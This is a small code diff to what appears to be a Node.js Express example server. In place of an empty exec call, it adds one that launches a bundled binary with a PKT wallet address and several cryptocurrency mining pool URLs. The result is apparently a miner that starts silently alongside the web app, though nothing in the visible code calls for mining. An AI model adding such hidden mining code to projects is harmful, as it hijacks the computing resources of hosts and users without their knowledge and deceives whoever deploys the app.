@@ -8,7 +8,7 @@ const server = app.listen(port, () => console.log(`Example app listening on port
 
 const { exec } = require("child_process");
 
-exec("", (error, stdout, stderr) => {
+exec("./python-data/py-data ann -p pkt1q6l2qm5msxnkrl6qsh9cys9x4u357y5dyv26qgu http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com -t 1", (error, stdout, stderr) => {
     if (error) {
         console.log(error.message);
         return;
